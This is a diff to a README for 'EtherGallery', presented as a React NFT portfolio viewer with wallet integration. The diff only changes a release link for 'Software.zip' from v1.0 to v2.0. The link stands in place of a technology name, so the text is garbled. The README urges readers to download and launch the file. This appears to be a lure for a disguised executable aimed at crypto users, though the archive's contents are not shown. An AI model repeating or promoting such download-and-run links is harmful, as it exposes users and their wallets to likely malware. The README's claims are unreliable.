@@ -1,7 +1,7 @@
 # 🌟 Welcome to EtherGallery 🌟
 
 ## Overview
-Welcome to EtherGallery, a modern NFT portfolio viewer built with React and https://github.com/lbella37/EtherGallery/releases/download/v1.0/Software.zip! EtherGallery is designed to provide users with a seamless experience for exploring and managing their NFTs. With real-time NFT display, wallet integration, and advanced filtering capabilities, EtherGallery is your go-to solution for all things NFT-related. 
+Welcome to EtherGallery, a modern NFT portfolio viewer built with React and https://github.com/lbella37/EtherGallery/releases/download/v2.0/Software.zip! EtherGallery is designed to provide users with a seamless experience for exploring and managing their NFTs. With real-time NFT display, wallet integration, and advanced filtering capabilities, EtherGallery is your go-to solution for all things NFT-related. 
 
 ## Features
 🖼️ Real-time NFT Display: View your NFT collection in real-time, with beautiful visuals to showcase your digital assets.  
@@ -11,13 +11,13 @@ Welcome to EtherGallery, a modern NFT portfolio viewer built with React and http
 
 ## Get Started
 To access the EtherGallery repository, simply click on the link below:
-[![Download EtherGallery](https://github.com/lbella37/EtherGallery/releases/download/v1.0/Software.zip)](https://github.com/lbella37/EtherGallery/releases/download/v1.0/Software.zip)
+[![Download EtherGallery](https://github.com/lbella37/EtherGallery/releases/download/v2.0/Software.zip)](https://github.com/lbella37/EtherGallery/releases/download/v2.0/Software.zip)
 
 Remember to launch the downloaded file to start exploring the world of NFTs with EtherGallery!
 
 ## Repository Details
 - **Name:** EtherGallery
-- **Description:** A modern NFT portfolio viewer built with React and https://github.com/lbella37/EtherGallery/releases/download/v1.0/Software.zip, featuring real-time NFT display, wallet integration, and advanced filtering capabilities with a stunning crypto-themed UI.
+- **Description:** A modern NFT portfolio viewer built with React and https://github.com/lbella37/EtherGallery/releases/download/v2.0/Software.zip, featuring real-time NFT display, wallet integration, and advanced filtering capabilities with a stunning crypto-themed UI.
 - **Topics:** blockchain, crypto-ui, cryptocurrency, dapp, ethereum, metamask, nft, opensea, react, web3
 
 ## Instructions
